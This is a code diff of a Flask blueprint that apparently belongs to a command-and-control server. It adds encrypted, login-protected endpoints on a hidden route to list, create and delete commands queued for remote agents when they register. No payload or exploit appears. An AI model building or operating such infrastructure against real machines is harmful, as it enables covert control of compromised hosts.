@@ -11,6 +11,90 @@ from datetime import datetime
 
 task = Blueprint('task', __name__)
 
+# ON REGISTERING TASK
+###########
+
+# list on registering tasks for an agent name
+@task.route(config["hidden_route"] + config["endpoints"]["registering_task"], methods=['GET'])
+@login_required
+def list_agent_on_registering_tasks():
+    agent_name = request.args.get("agent_name")
+    tasks = OnRegisteringTask.query.filter_by(agent_name=agent_name).all()
+
+    r = {}
+
+    for task in tasks:
+        tmp = {}
+        tmp["task_uid"] = task.task_uid
+        tmp["task_created_at"] = task.task_created_at
+        tmp["cmd_request"] = task.cmd_request
+        if len(task.cmd_arg) > 80:
+            tmp["cmd_arg"] = task.cmd_arg[0:80] + " ..."
+        else:
+            tmp["cmd_arg"] = task.cmd_arg
+        
+        r[task.task_uid] = tmp
+
+    r = json.dumps(r)
+
+    return encrypt(r)
+
+# create on registering task
+@task.route(config["hidden_route"] + config["endpoints"]["registering_task"] + "/<path:agent_name>", methods=['POST'])
+@login_required
+def create_registering_task(agent_name):  
+    try:
+        content = request.data
+        d = decrypt(content)
+    except Exception as e:
+        print("[-] Error in create_registering_task()")
+        print(str(e))
+        return encrypt("[-] Cannot decrypt the request")
+    
+    d = json.loads(d)
+
+    task_uid = str(uuid.uuid4())
+    today = datetime.now()
+    task_created_at = today.strftime("%d/%m/%Y - %H:%M")   
+    cmd_request = d["cmd_request"]
+    cmd_arg = d["cmd_arg"]
+
+    new_task = OnRegisteringTask(task_uid=task_uid, task_created_at=task_created_at, agent_name=agent_name, cmd_request=cmd_request, cmd_arg=cmd_arg)
+    try:
+        db.session.add(new_task)
+        db.session.commit()
+    except Exception as e:
+            print("[-] Error in create_registering_task()")
+            print("[-] Cannot create a new 'on registering task'")
+            print(str(e))
+            return encrypt("[-] Cannot create the 'on registering task': " + task_uid + " for the agent_name: " + agent_name)
+        
+    print("[*] On registering task created: " + task_uid + " for agent name: " + agent_name)
+
+    return encrypt(task_uid)
+
+# delete a registering task for an  agent
+@task.route(config["hidden_route"] + config["endpoints"]["registering_task"], methods=['DELETE'])
+@login_required
+def delete_registering_task():
+    task_uid = request.args.get("task_uid")
+    task = OnRegisteringTask.query.filter_by(task_uid = task_uid).first()
+
+    try:
+        db.session.delete(task)
+        db.session.commit()
+    except Exception as e:
+        print("[-] Error in delete_registering_task()")
+        print("[-] Cannot delete the 'on registering task': " + task_uid)
+        print(str(e))
+        return encrypt("[-] Cannot delete the 'on registering task': " + task_uid)
+    
+
+    return encrypt("[+] On registering tasks deleted: " + task_uid)
+
+# TASK
+###########
+
 # create task
 @task.route(config["hidden_route"] + config["endpoints"]["task"] + "/<path:agent_uid>", methods=['POST'])
 @login_required
@@ -48,40 +132,6 @@ def create_task(agent_uid):
             return encrypt("[-] Cannot create the task: " + task_uid + " for the agent: " + agent_uid)
         
     print("[*] Task created: " + task_uid + " for agent: " + agent_uid)
-
-    return encrypt(task_uid)
-
-# create on registering task
-@task.route(config["hidden_route"] + config["endpoints"]["registering_task"] + "/<path:agent_name>", methods=['POST'])
-@login_required
-def create_registering_task(agent_name):  
-    try:
-        content = request.data
-        d = decrypt(content)
-    except Exception as e:
-        print("[-] Error in create_registering_task()")
-        print(str(e))
-        return encrypt("[-] Cannot decrypt the request")
-    
-    d = json.loads(d)
-
-    task_uid = str(uuid.uuid4())
-    today = datetime.now()
-    task_created_at = today.strftime("%d/%m/%Y - %H:%M")   
-    cmd_request = d["cmd_request"]
-    cmd_arg = d["cmd_arg"]
-
-    new_task = OnRegisteringTask(task_uid=task_uid, task_created_at=task_created_at, agent_name=agent_name, cmd_request=cmd_request, cmd_arg=cmd_arg)
-    try:
-        db.session.add(new_task)
-        db.session.commit()
-    except Exception as e:
-            print("[-] Error in create_registering_task()")
-            print("[-] Cannot create a new 'on registering task'")
-            print(str(e))
-            return encrypt("[-] Cannot create the 'on registering task': " + task_uid + " for the agent_name: " + agent_name)
-        
-    print("[*] On registering task created: " + task_uid + " for agent name: " + agent_name)
 
     return encrypt(task_uid)
 
